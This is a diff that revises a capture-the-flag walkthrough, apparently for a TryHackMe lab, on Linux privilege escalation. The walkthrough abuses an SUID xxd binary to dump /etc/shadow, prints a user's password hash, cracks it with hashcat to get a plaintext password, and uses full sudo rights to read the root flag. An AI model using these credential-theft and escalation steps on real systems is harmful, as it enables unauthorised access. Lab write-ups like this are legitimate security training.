@@ -190,6 +190,8 @@ Exploit xxd (has SUID)
 find -type f -perm /4000 2>/dev/null
 ```
 
+We can get /etc/shadow.
+
 ```shell
 www-data@ubuntu:/var/www/html$ xxd /etc/shadow | xxd -r
 xxd /etc/shadow | xxd -r
@@ -220,78 +222,46 @@ _apt:*:17953:0:99999:7:::
 messagebus:*:18506:0:99999:7:::
 uuidd:*:18506:0:99999:7:::
 vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
-www-data@ubuntu:/var/www/html$ find / -type f -perm /4000 2>/dev/null                                                           
-find / -type f -perm /4000 2>/dev/null
-/bin/ping
-/bin/fusermount
-/bin/mount
-/bin/su
-/bin/ping6
-/bin/umount
-/usr/bin/chfn
-/usr/bin/xxd
-/usr/bin/newgrp
-/usr/bin/sudo
-/usr/bin/passwd
-/usr/bin/gpasswd
-/usr/bin/chsh
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-www-data@ubuntu:/var/www/html$ su vianka
+```
+
+Run viankas password through `hashcat`.
+Make sure to escape the `$`s... `\$`.
+
+```shell
+hashcat -a 0 -m 1800 \$6\$2p.tSTds\$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/
+```
+
+Switch user to `vianka`.
+
+```shell
 su vianka
 Password: beautiful1
+```
 
-vianka@ubuntu:/var/www/html$ ls -lah
-ls -lah
-total 24K
-drwxrwxrwx 2 root   root   4.0K Oct  3 09:17 .
-drwxr-xr-x 3 root   root   4.0K Sep  2 09:54 ..
--rw-r--r-- 1 root   root    12K Sep  2 09:54 index.html
--rw-r--r-- 1 vianka vianka  145 Oct  3 09:17 true.php
-vianka@ubuntu:/var/www/html$ cd ~
-cd ~
-vianka@ubuntu:~$ ls
-ls
-redis-stable  user.txt
-vianka@ubuntu:~$ ls -lah
-ls -lah
-total 44K
-drwxr-xr-x 5 vianka vianka 4.0K Sep  2 13:52 .
-drwxr-xr-x 3 root   root   4.0K Sep  1 17:02 ..
--rw------- 1 vianka vianka 3.5K Sep  2 14:12 .bash_history
--rw-r--r-- 1 vianka vianka  220 Sep  1 17:02 .bash_logout
--rw-r--r-- 1 vianka vianka 3.7K Sep  1 17:02 .bashrc
-drwx------ 2 vianka vianka 4.0K Sep  1 17:47 .cache
-drwxrwxr-x 2 vianka vianka 4.0K Sep  2 10:04 .nano
--rw-r--r-- 1 vianka vianka  655 Sep  1 17:02 .profile
-drwxrwxr-x 7 vianka vianka 4.0K Sep  2 09:39 redis-stable
--rw-r--r-- 1 root   root   1.1K Sep  2 09:31 .service: Failed with result start-limit-hit?
--rw-r--r-- 1 vianka vianka    0 Sep  1 17:47 .sudo_as_admin_successful
--rw-rw-r-- 1 vianka vianka   35 Sep  2 13:52 user.txt
+```shell
 vianka@ubuntu:~$ sudo -l
-sudo -l
-[sudo] password for vianka: beautful1
+```
 
-Sorry, try again.
-[sudo] password for vianka: beautiful1
+Check `vianka`'s `sudo -l`.
 
+```shell
 Matching Defaults entries for vianka on ubuntu:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User vianka may run the following commands on ubuntu:
     (ALL : ALL) ALL
-vianka@ubuntu:~$ sudo -u=0 /bin/sh
-sudo -u=0 /bin/sh
-sudo: unknown user: =0
-sudo: unable to initialize policy plugin
-vianka@ubuntu:~$ sudo cat /root/root.txt
-sudo cat /root/root.txt
-thm{xxd_pr1v_escalat1on}
-vianka@ubuntu:~$
 ```
 
+We can run all commands with `sudo`.
+
+
+```shell
+vianka@ubuntu:~$ sudo cat /root/root.txt
+sudo cat /root/root.txt
+thm{redacted}
+```
+
+And there we have it.
 
 
